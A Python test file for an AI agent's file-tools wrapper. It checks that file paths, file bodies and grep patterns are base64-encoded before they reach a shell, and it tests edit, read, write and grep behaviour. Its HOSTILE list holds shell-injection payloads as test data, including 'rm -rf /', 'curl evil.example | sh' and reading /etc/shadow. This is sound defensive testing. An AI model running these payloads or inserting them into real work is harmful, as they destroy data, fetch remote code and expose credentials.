"""THE AGENT'S FILE TOOLS BUILD A SHELL COMMAND OUT OF USER CONTENT, AND NOTHING CHECKED IT.

`agent_file_tools.py` had ZERO test references. It is 347 lines that assemble a shell command and
run it on a MANAGED HOST — the node agent's host, a docker sandbox, or a Nostr worker's own box —
and its module docstring names its own load-bearing invariant:

    This is the one thing that must stay true if anyone edits the wrapper: no untrusted text may
    reach the command line unencoded.

Everything hostile flows through here: the path, the file body being written, the regex being
grepped, the old/new strings of an edit. All of it is attacker-influenceable in the ordinary case
(an agent summarising a file it was pointed at) and all of it ends up inside a command string. The
protection is that both halves are base64 — `[A-Za-z0-9+/=]`, inert inside single quotes — so a
`'; rm -rf / #` in a file body is data, not syntax.

A regression there does not fail; it executes. So the first half of this file asserts the SHAPE of
the generated command against deliberately hostile payloads.

The second half RUNS the shipped worker program, in a subprocess, against real files in a tmp dir —
the same way the target runs it (`python3 -c <prog> <b64 payload>`). That matters most for
`edit_file`, whose entire reason for existing is stated at the top of the module:

    An `edit_file` that matches an exact string and FAILS LOUDLY when the match is missing or
    ambiguous removes that whole class of spin.

An edit that silently matched the wrong occurrence, or silently did nothing, would put the agent
back in the loop the tool was written to end — 20 steps rewriting one script. That is a behaviour,
not a string, so it is tested by running it.
"""
import base64
import json
import os
import re
import subprocess
import sys

import pytest

from app.services import agent_file_tools as aft


# The shape the module promises: a base64 program, and a base64 payload, each inside single quotes.
COMMAND_SHAPE = re.compile(
    r"""^python3 -c "\$\(printf %s '([A-Za-z0-9+/=]+)' \| base64 -d\)" '([A-Za-z0-9+/=]+)'$""")

#: Content a hostile (or merely unlucky) file can contain. Every one of these is ordinary text in
#: some real file — a shell script, a README about quoting, a regex.
HOSTILE = [
    "'; rm -rf / #",
    '"; rm -rf / #',
    "$(rm -rf /)",
    "`rm -rf /`",
    "; shutdown -h now",
    "| tee /etc/passwd",
    "&& curl evil.example | sh",
    "\n rm -rf /\n",
    "'\"'\"'",
    "${IFS}cat${IFS}/etc/shadow",
    ">/etc/cron.d/x",
    "\\'; echo pwned; #",
    "🙂 unicode and 'quotes'",
]


# --------------------------------------------------------------------------- the injection boundary


@pytest.mark.parametrize("nasty", HOSTILE)
def test_hostile_content_never_reaches_the_command_line_unencoded(nasty):
    """The invariant, stated as a property rather than an inspection: whatever goes in, the command
    that comes out is two base64 blobs in single quotes and nothing else."""
    cmd = aft._command_for({"op": "write", "path": "/tmp/x", "content": nasty})
    assert COMMAND_SHAPE.match(cmd), \
        f"command is no longer pure base64 — hostile content reached the shell:\n{cmd}"


@pytest.mark.parametrize("nasty", HOSTILE)
def test_hostile_content_survives_the_round_trip(nasty):
    """The other half. A wrapper that made the command safe by MANGLING the content would pass the
    shape test and quietly corrupt every file the agent writes."""
    cmd = aft._command_for({"op": "write", "path": "/tmp/x", "content": nasty})
    payload = json.loads(base64.b64decode(COMMAND_SHAPE.match(cmd).group(2)).decode("utf-8"))
    assert payload["content"] == nasty


@pytest.mark.parametrize("nasty", HOSTILE)
def test_a_hostile_path_is_encoded_too(nasty):
    """The path is as attacker-influenceable as the body, and is the argument most likely to be
    hand-built by a future caller."""
    cmd = aft._command_for({"op": "read", "path": nasty})
    assert COMMAND_SHAPE.match(cmd), f"a hostile path reached the shell:\n{cmd}"


@pytest.mark.parametrize("nasty", HOSTILE)
def test_a_hostile_grep_pattern_is_encoded_too(nasty):
    cmd = aft._command_for({"op": "grep", "path": ".", "pattern": nasty, "glob": nasty})
    assert COMMAND_SHAPE.match(cmd)


def test_the_worker_program_contains_no_single_quote():
    """Stated in the source: the program is kept quote-free so the wrapper stays safe even if it is
    ever changed to interpolate the program directly instead of base64-ing it."""
    assert "'" not in aft._FILE_OP_PY, \
        "the worker program grew a single quote — the wrapper is only safe while it has none"


def test_the_encoded_program_is_pure_base64():
    assert re.fullmatch(r"[A-Za-z0-9+/=]+", aft._PROG_B64)


def test_the_encoded_program_decodes_back_to_the_source():
    assert base64.b64decode(aft._PROG_B64).decode("utf-8") == aft._FILE_OP_PY


def test_the_shape_test_can_actually_fail():
    """Proves the regex is load-bearing rather than permissive: an unencoded command must not
    match it. Without this, a typo making COMMAND_SHAPE match anything would silently disable
    every injection test above."""
    assert not COMMAND_SHAPE.match("python3 -c 'print(1)' '; rm -rf /'")
    assert not COMMAND_SHAPE.match("echo hi")


# --------------------------------------------------------------------------- run the real worker


def _run(payload):
    """Exactly how the target runs it: `python3 -c <program> <base64 payload>`."""
    arg = base64.b64encode(json.dumps(payload).encode()).decode()
    p = subprocess.run([sys.executable, "-c", aft._FILE_OP_PY, arg],
                       capture_output=True, text=True, timeout=60)
    return json.loads(p.stdout)


@pytest.fixture
def f(tmp_path):
    p = tmp_path / "sample.py"
    p.write_text("alpha\nbeta\ngamma\nbeta\n", encoding="utf-8")
    return p


# ---- read


def test_read_returns_numbered_lines(f):
    r = _run({"op": "read", "path": str(f)})
    assert r["ok"]
    assert "     1\talpha" in r["content"]
    assert "     2\tbeta" in r["content"]


def test_read_pages_and_says_how_to_continue(f):
    r = _run({"op": "read", "path": str(f), "limit": 2})
    assert r["ok"]
    assert "gamma" not in r["content"]
    assert "offset=3" in r["content"], "a truncated read must say how to get the rest"


def test_read_past_the_end_says_so_instead_of_returning_nothing(f):
    """An empty answer reads as an empty file, which sends the agent off rewriting it."""
    r = _run({"op": "read", "path": str(f), "offset": 99})
    assert r["ok"] and "no lines at offset 99" in r["content"] and "4 line(s)" in r["content"]


def test_a_missing_file_is_an_error_not_empty_content(tmp_path):
    r = _run({"op": "read", "path": str(tmp_path / "nope.txt")})
    assert r["ok"] is False and "no such file" in r["error"]


def test_a_directory_is_refused_by_name(tmp_path):
    r = _run({"op": "read", "path": str(tmp_path)})
    assert r["ok"] is False and "is a directory" in r["error"]


# ---- edit: the whole reason the module exists


def test_edit_replaces_an_exact_unique_match(f):
    r = _run({"op": "edit", "path": str(f), "old_string": "alpha", "new_string": "ALPHA"})
    assert r["ok"], r.get("error")
    assert f.read_text() == "ALPHA\nbeta\ngamma\nbeta\n"


def test_a_missing_match_fails_loudly_and_says_why(f):
    """The stated purpose. A silent no-op is what made the model rewrite the same file 20 times."""
    before = f.read_text()
    r = _run({"op": "edit", "path": str(f), "old_string": "not in the file",
              "new_string": "x"})
    assert r["ok"] is False
    assert "NOT found" in r["error"]
    assert "byte for byte" in r["error"], "the error must tell the model how to fix its input"
    assert f.read_text() == before, "a failed edit still changed the file"


def test_an_ambiguous_match_is_refused_with_the_count(f):
    """"beta" appears twice. Replacing the first silently is the dangerous outcome: the agent sees
    success and the wrong line changed."""
    before = f.read_text()
    r = _run({"op": "edit", "path": str(f), "old_string": "beta", "new_string": "BETA"})
    assert r["ok"] is False
    assert "matches 2 places" in r["error"]
    assert "replace_all" in r["error"], "the error must name the way forward"
    assert f.read_text() == before


def test_replace_all_is_the_explicit_way_past_ambiguity(f):
    r = _run({"op": "edit", "path": str(f), "old_string": "beta", "new_string": "BETA",
              "replace_all": True})
    assert r["ok"]
    assert f.read_text() == "alpha\nBETA\ngamma\nBETA\n"
    assert "replaced 2 occurrence(s)" in r["content"]


def test_an_identical_edit_is_refused(f):
    r = _run({"op": "edit", "path": str(f), "old_string": "beta", "new_string": "beta"})
    assert r["ok"] is False and "identical" in r["error"]


def test_an_empty_old_string_is_refused(f):
    """`"".count()` is nonzero everywhere, so an empty match would splice the new text between
    every character in the file."""
    before = f.read_text()
    r = _run({"op": "edit", "path": str(f), "old_string": "", "new_string": "x"})
    assert r["ok"] is False and "empty" in r["error"]
    assert f.read_text() == before


def test_editing_a_missing_file_is_an_error(tmp_path):
    r = _run({"op": "edit", "path": str(tmp_path / "nope"), "old_string": "a", "new_string": "b"})
    assert r["ok"] is False and "no such file" in r["error"]


def test_an_edit_echoes_the_changed_region_back(f):
    """"so the model can SEE the applied result and does not need a second read to believe the edit
    landed" — without it the agent spends a turn re-reading every file it touches."""
    r = _run({"op": "edit", "path": str(f), "old_string": "gamma", "new_string": "GAMMA"})
    assert r["ok"] and "GAMMA" in r["content"] and "\t" in r["content"]


@pytest.mark.parametrize("nasty", HOSTILE)
def test_hostile_text_can_be_written_and_read_back_verbatim(tmp_path, nasty):
    """End to end through the real program: the bytes that arrive are the bytes that were sent, and
    nothing in them was executed on the way."""
    p = tmp_path / "hostile.txt"
    assert _run({"op": "write", "path": str(p), "content": nasty})["ok"]
    assert p.read_text(encoding="utf-8") == nasty


# ---- write


def test_write_creates_missing_parent_directories(tmp_path):
    p = tmp_path / "a" / "b" / "c.txt"
    r = _run({"op": "write", "path": str(p), "content": "hi"})
    assert r["ok"] and p.read_text() == "hi"
    assert "created" in r["content"]


def test_write_says_overwrote_when_it_overwrote(f):
    r = _run({"op": "write", "path": str(f), "content": "new"})
    assert r["ok"] and "overwrote" in r["content"]


def test_write_without_content_is_refused(tmp_path):
    r = _run({"op": "write", "path": str(tmp_path / "x")})
    assert r["ok"] is False and "needs content" in r["error"]


# ---- grep


def test_grep_reports_path_line_and_text(tmp_path):
    (tmp_path / "a.py").write_text("import os\nx = 1\n")
    r = _run({"op": "grep", "path": str(tmp_path), "pattern": r"import\s+os"})
    assert r["ok"] and "a.py:1:import os" in r["content"]


def test_grep_says_no_matches_rather_than_returning_nothing(tmp_path):
    (tmp_path / "a.py").write_text("nothing here\n")
    r = _run({"op": "grep", "path": str(tmp_path), "pattern": "zzz"})
    assert r["ok"] and r["content"] == "(no matches)"


def test_a_bad_regex_is_reported_as_a_bad_regex(tmp_path):
    """Not as "no matches" — the model would accept that and move on with a wrong conclusion."""
    r = _run({"op": "grep", "path": str(tmp_path), "pattern": "([unclosed"})
    assert r["ok"] is False and "bad regular expression" in r["error"]


def test_grep_skips_the_noise_directories(tmp_path):
    (tmp_path / ".git").mkdir()
    (tmp_path / ".git" / "config").write_text("needle\n")
    (tmp_path / "node_modules").mkdir()
    (tmp_path / "node_modules" / "x.js").write_text("needle\n")
    (tmp_path / "real.py").write_text("needle\n")
    r = _run({"op": "grep", "path": str(tmp_path), "pattern": "needle"})
    assert "real.py" in r["content"]
    assert ".git" not in r["content"] and "node_modules" not in r["content"]


def test_grep_honours_a_glob(tmp_path):
    (tmp_path / "a.py").write_text("needle\n")
    (tmp_path / "b.txt").write_text("needle\n")
    r = _run({"op": "grep", "path": str(tmp_path), "pattern": "needle", "glob": "*.py"})
    assert "a.py" in r["content"] and "b.txt" not in r["content"]


def test_grep_caps_its_output_and_says_it_capped(tmp_path):
    """Uncapped, one broad pattern floods the agent's context and the run dies of its own output."""
    (tmp_path / "big.txt").write_text("needle\n" * 500)
    r = _run({"op": "grep", "path": str(tmp_path), "pattern": "needle"})
    assert r["ok"] and "capped at 200" in r["content"]
    assert len(r["content"].splitlines()) <= 202


def test_an_unreadable_file_does_not_abort_the_whole_grep(tmp_path):
    """One binary or permission-denied file among thousands must not cost every later match."""
    (tmp_path / "bin.dat").write_bytes(b"\xff\xfe\x00\x01")
    (tmp_path / "z.py").write_text("needle\n")
    r = _run({"op": "grep", "path": str(tmp_path), "pattern": "needle"})
    assert r["ok"] and "z.py" in r["content"]


# ---- the program never crashes out


def test_an_unknown_op_is_reported_as_json(tmp_path):
    r = _run({"op": "explode", "path": str(tmp_path)})
    assert r["ok"] is False and "unknown op" in r["error"]


def test_a_malformed_request_is_reported_as_json():
    """The caller parses stdout as JSON and treats anything else as "python3 is missing". A
    traceback here would be reported to the model as a broken host."""
    p = subprocess.run([sys.executable, "-c", aft._FILE_OP_PY, "not-base64!!"],
                       capture_output=True, text=True, timeout=60)
    assert json.loads(p.stdout)["ok"] is False


# --------------------------------------------------------------------------- the caller


def _call(name, args):
    import asyncio
    seen = {}

    async def exec_cmd(cmd):
        seen["cmd"] = cmd
        arg = COMMAND_SHAPE.match(cmd).group(2)
        payload = json.loads(base64.b64decode(arg).decode())
        return 0, json.dumps(_run(payload))

    ok, text = asyncio.run(aft.run_file_op(exec_cmd, name, args))
    return ok, text, seen.get("cmd")


def test_the_public_entry_point_runs_a_real_edit(f):
    ok, text, cmd = _call("edit_file", {"path": str(f), "old_string": "alpha",
                                        "new_string": "ALPHA"})
    assert ok, text
    assert f.read_text().startswith("ALPHA")
    assert COMMAND_SHAPE.match(cmd)


def test_an_oversized_write_is_refused_before_it_becomes_a_command_line(tmp_path):
    """ARG_MAX is ~2 MB and `docker exec` adds its own overhead, so an oversized write does not
    fail cleanly — it fails as a shell error the model then tries to fix by editing a file."""
    ok, text, cmd = _call("write_file", {"path": str(tmp_path / "big"),
                                         "content": "x" * (aft._MAX_WRITE_BYTES + 1)})
    assert ok is False
    assert "too large" in text
    assert cmd is None, "the command was built anyway"


def test_a_write_at_the_limit_actually_EXECS(tmp_path):
    """THE CAP HAS TO BE A NUMBER THE KERNEL WILL ACCEPT, so this runs a real write at exactly it.

    It was 512 KiB, picked against ARG_MAX (~2 MB). The bound that applies is MAX_ARG_STRLEN — 32
    pages, 128 KiB — which caps a SINGLE argv string, and the whole `sh -c "<command>"` is one.
    Base64 inflates by 4/3, so measured on this box:

        content  90,000 -> command 127,631 -> ok
        content  95,000 -> command 134,299 -> OSError 7, Argument list too long
        content 524,288 -> command 706,683 -> OSError 7

    Everything from ~92 KB to the old 512 KB cap passed the size check and then failed as a raw
    shell error — which `run_file_op` hands to the model as "read_file failed: …", and a model that
    is told a file operation failed edits the file and tries again.

    Asserting the constant would not have caught it. Only exec does."""
    p = tmp_path / "big"
    ok, text, cmd = _call("write_file", {"path": str(p), "content": "x" * aft._MAX_WRITE_BYTES})
    assert ok, text
    assert p.stat().st_size == aft._MAX_WRITE_BYTES


def test_the_command_at_the_cap_stays_well_inside_MAX_ARG_STRLEN(tmp_path):
    """The margin, stated as a number rather than left to the exec above — that one passes on this
    machine's page size, and `docker exec` adds overhead this test cannot see."""
    cmd = aft._command_for({"op": "write", "path": "/tmp/x",
                            "content": "x" * aft._MAX_WRITE_BYTES})
    assert len(cmd) < 100_000, (
        f"a write at the cap builds a {len(cmd)}-byte command; MAX_ARG_STRLEN is 131072 and "
        f"docker exec adds more — lower _MAX_WRITE_BYTES")


def test_a_tool_with_no_path_is_refused_by_name(tmp_path):
    for name in ("read_file", "write_file", "edit_file"):
        args = {"content": "x", "old_string": "a", "new_string": "b"}
        ok, text, _ = _call(name, args)
        assert ok is False and "needs `path`" in text


def test_an_unknown_tool_name_is_reported_not_executed():
    ok, text, cmd = _call("delete_everything", {"path": "/"})
    assert ok is False and "unknown file tool" in text and cmd is None


def test_a_dead_transport_is_reported_as_a_transport_failure(tmp_path):
    """"transport died, not a tool failure" — the distinction matters, because the model's response
    to a tool failure is to change its arguments and try again."""
    import asyncio

    async def boom(cmd):
        raise OSError("ssh: connect to host nas.lan port 22: No route to host")

    ok, text = asyncio.run(aft.run_file_op(boom, "read_file", {"path": str(tmp_path / "x")}))
    assert ok is False and "could not run read_file on the host" in text


def test_a_host_without_python3_is_named_as_the_cause(tmp_path):
    """Exit 127 with a shell error is the common real failure. Handed to the model raw it reads as
    a broken file and it starts editing things."""
    import asyncio

    async def missing(cmd):
        return 127, "python3: command not found"

    ok, text = asyncio.run(aft.run_file_op(missing, "read_file", {"path": str(tmp_path / "x")}))
    assert ok is False and "no `python3`" in text


def test_every_declared_tool_is_wired_to_an_op():
    """A schema advertised to the model with no implementation behind it is a tool the agent will
    call and always fail on."""
    declared = {t["function"]["name"] for t in aft.FILE_TOOLS}
    assert declared == set(aft._OPS), \
        f"declared {declared} but implemented {set(aft._OPS)}"


def test_labels_never_crash_on_missing_arguments():
    """The label goes in the play-by-play, which runs even when the call was malformed."""
    for name in list(aft._OPS) + ["grep"]:
        assert isinstance(aft.label_for(name, {}), str)
